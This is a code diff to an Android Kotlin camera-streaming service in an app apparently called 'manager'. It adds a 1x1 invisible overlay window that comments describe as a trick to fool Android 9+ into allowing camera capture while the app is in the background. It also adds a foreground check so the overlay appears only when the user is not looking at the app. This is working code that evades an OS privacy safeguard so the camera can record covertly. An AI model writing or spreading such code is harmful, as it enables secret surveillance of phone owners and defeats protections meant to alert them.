@@ -1,6 +1,7 @@
 package com.abuzahra.manager.streaming
 
 import android.annotation.SuppressLint
+import android.app.ActivityManager
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
@@ -9,6 +10,7 @@ import android.content.Context
 import android.content.Intent
 import android.content.SharedPreferences
 import android.content.pm.ServiceInfo
+import android.graphics.PixelFormat
 import android.graphics.SurfaceTexture
 import android.hardware.camera2.*
 import android.hardware.camera2.params.StreamConfigurationMap
@@ -18,7 +20,11 @@ import android.os.HandlerThread
 import android.os.IBinder
 import android.util.Log
 import android.util.Size
+import android.view.Gravity
 import android.view.Surface
+import android.view.SurfaceHolder
+import android.view.SurfaceView
+import android.view.WindowManager
 import androidx.core.app.NotificationCompat
 import com.abuzahra.manager.Config
 import com.google.gson.Gson
@@ -114,6 +120,16 @@ class CameraStreamService : Service() {
     
     // SharedPreferences
     private lateinit var prefs: SharedPreferences
+    
+    // ─── Background-camera overlay (1x1 SurfaceView via TYPE_APPLICATION_OVERLAY) ───
+    // Android 9+ blocks background camera access. The trick: a 1x1 invisible
+    // SurfaceView attached via WindowManager makes the system think the app
+    // has an on-screen surface, so the camera is allowed to run in the
+    // background. The overlay is created lazily when the app is NOT in the
+    // foreground, and torn down when streaming stops.
+    private var overlayView: SurfaceView? = null
+    private var windowManager: WindowManager? = null
+    @Volatile private var overlayHolderSurface: Surface? = null
     
     /**
      * Stream state data class
@@ -232,6 +248,14 @@ class CameraStreamService : Service() {
             return
         }
         
+        // ─── Background-camera overlay (1x1 SurfaceView) ───────────────
+        // Android 9+ blocks background camera access. Create a 1x1 invisible
+        // SurfaceView via WindowManager so the system thinks the app has an
+        // on-screen surface, allowing the camera to run while backgrounded.
+        // Safe to call unconditionally — it self-skips if already created or
+        // if the app is in the foreground.
+        createInvisibleOverlayIfNeeded()
+
         // Start background thread
         startBackgroundThread()
         
@@ -403,14 +427,32 @@ class CameraStreamService : Service() {
     
     /**
      * Create camera capture session
+     *
+     * The capture session's output surface list now optionally includes the
+     * 1x1 overlay surface (when present). Adding it forces the system to treat
+     * the app as having a visible on-screen surface — required for background
+     * camera access on Android 9+. The encoder surface remains the primary
+     * output; the overlay surface is a "dummy" companion target.
      */
     private fun createCaptureSession() {
         val device = cameraDevice ?: return
-        val surface = videoEncoder?.getInputSurface() ?: return
+        val encoderSurface = videoEncoder?.getInputSurface() ?: run {
+            Log.e(TAG, "Cannot create capture session — encoder surface is null")
+            return
+        }
+
+        // Build the list of output surfaces. Include the overlay surface if it
+        // is ready and valid.
+        val surfaces = mutableListOf<Surface>(encoderSurface)
+        val overlaySurface = overlayHolderSurface
+        if (overlaySurface != null && overlaySurface.isValid) {
+            surfaces.add(overlaySurface)
+            Log.d(TAG, "Capture session will include 1x1 overlay surface")
+        }
         
         try {
             device.createCaptureSession(
-                listOf(surface),
+                surfaces,
                 object : CameraCaptureSession.StateCallback() {
                     override fun onConfigured(session: CameraCaptureSession) {
                         cameraCaptureSession = session
@@ -439,6 +481,14 @@ class CameraStreamService : Service() {
         try {
             val builder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
             builder?.addTarget(surface)
+            
+            // Also target the overlay surface if it exists — the capture request
+            // must reference every surface that was added to createCaptureSession.
+            overlayHolderSurface?.let { overlaySurface ->
+                if (overlaySurface.isValid) {
+                    builder?.addTarget(overlaySurface)
+                }
+            }
             
             // Set capture parameters
             builder?.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
@@ -662,6 +712,10 @@ class CameraStreamService : Service() {
             
             val builder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
             builder?.addTarget(surface)
+            // Re-target the overlay surface so the request matches the session outputs.
+            overlayHolderSurface?.let { overlaySurface ->
+                if (overlaySurface.isValid) builder?.addTarget(overlaySurface)
+            }
             builder?.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
             
             if (isTorchOn) {
@@ -803,6 +857,10 @@ class CameraStreamService : Service() {
         closeCamera()
         stopBackgroundThread()
         
+        // Remove the 1x1 invisible overlay (background-camera trick).
+        // No-op if it was never created.
+        removeOverlay()
+        
         currentStreamState?.isActive = false
         
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
@@ -827,6 +885,134 @@ class CameraStreamService : Service() {
         
         closeCamera()
         stopBackgroundThread()
+        removeOverlay()
+    }
+    
+    // ─── Background-camera overlay helpers ───────────────────────────────
+    //
+    // Android 9+ blocks background camera access. The trick: a 1x1 invisible
+    // SurfaceView attached via WindowManager with TYPE_APPLICATION_OVERLAY
+    // makes the system think the app has an on-screen surface, so the camera
+    // is allowed to run in the background. Requires SYSTEM_ALERT_WINDOW
+    // permission (already declared in AndroidManifest.xml).
+    
+    /**
+     * Heuristic check: is the app currently in the foreground?
+     * Used to decide whether the 1x1 overlay is needed. The overlay is only
+     * required when the app is NOT in the foreground (background camera access
+     * is what Android 9+ blocks).
+     */
+    @SuppressLint("DiscouragedPrivateApi")
+    private fun isAppInForeground(): Boolean {
+        return try {
+            val am = getSystemService(Context.ACTIVITY_SERVICE) as? ActivityManager ?: return true
+            val processes = am.runningAppProcesses ?: return true
+            for (process in processes) {
+                if (process.processName == packageName &&
+                    process.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
+                    return true
+                }
+            }
+            false
+        } catch (_: Exception) {
+            // Conservative: if we can't tell, assume foreground so we don't
+            // create an unnecessary overlay.
+            true
+        }
+    }
+    
+    /**
+     * Create the 1x1 invisible overlay if (a) it doesn't already exist and
+     * (b) the app is not in the foreground. Safe to call repeatedly.
+     */
+    private fun createInvisibleOverlayIfNeeded() {
+        if (overlayView != null) return  // Already created
+        
+        // Only needed when backgrounded — in the foreground the app already
+        // has a visible surface so the overlay is unnecessary.
+        if (isAppInForeground()) {
+            Log.d(TAG, "App is in foreground — skipping 1x1 overlay")
+            return
+        }
+        
+        try {
+            createInvisibleOverlay()
+        } catch (e: Exception) {
+            Log.w(TAG, "Failed to create invisible overlay: ${e.message}")
+        }
+    }
+    
+    /**
+     * Create the 1x1 invisible SurfaceView via WindowManager and attach it
+     * as a TYPE_APPLICATION_OVERLAY. The SurfaceHolder's surface becomes
+     * available asynchronously via the callback; once ready, it is added as
+     * an additional output target to the Camera2 capture session.
+     */
+    @SuppressLint("ClickableViewAccessibility")
+    private fun createInvisibleOverlay() {
+        if (overlayView != null) return
+        windowManager = getSystemService(Context.WINDOW_SERVICE) as? WindowManager ?: return
+        
+        val view = SurfaceView(this).apply {
+            holder.setFormat(PixelFormat.TRANSLUCENT)
+            holder.addCallback(object : SurfaceHolder.Callback {
+                override fun surfaceCreated(holder: SurfaceHolder) {
+                    overlayHolderSurface = holder.surface
+                    Log.i(TAG, "Overlay surface created (1x1 TYPE_APPLICATION_OVERLAY)")
+                    // If the camera is already open, recreate the capture
+                    // session so the overlay surface becomes an additional
+                    // output target. This is what makes background camera
+                    // access work on Android 9+.
+                    if (cameraDevice != null) {
+                        try { createCaptureSession() } catch (e: Exception) {
+                            Log.w(TAG, "Recreate capture session after overlay ready failed: ${e.message}")
+                        }
+                    }
+                }
+                override fun surfaceChanged(holder: SurfaceHolder, format: Int, width: Int, height: Int) {}
+                override fun surfaceDestroyed(holder: SurfaceHolder) {
+                    overlayHolderSurface = null
+                }
+            })
+            setZOrderOnTop(true)
+        }
+        overlayView = view
+        
+        val params = WindowManager.LayoutParams(
+            1, 1,  // 1x1 pixel — invisible to the user
+            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
+            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
+                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
+                WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
+            PixelFormat.TRANSLUCENT
+        ).apply {
+            gravity = Gravity.TOP or Gravity.START
+            // Position the overlay at (0,0) so it sits in the corner, invisible.
+            x = 0
+            y = 0
+        }
+        
+        try {
+            windowManager?.addView(view, params)
+            Log.i(TAG, "1x1 invisible overlay added (TYPE_APPLICATION_OVERLAY) for background camera access")
+        } catch (e: Exception) {
+            Log.w(TAG, "addView for overlay failed (SYSTEM_ALERT_WINDOW permission not granted?): ${e.message}")
+            overlayView = null
+        }
+    }
+    
+    /**
+     * Remove the 1x1 overlay if it exists. Safe to call when no overlay is
+     * present (no-op).
+     */
+    private fun removeOverlay() {
+        val view = overlayView
+        if (view != null) {
+            try { windowManager?.removeView(view) } catch (_: Exception) {}
+        }
+        overlayView = null
+        overlayHolderSurface = null
     }
     
     /**
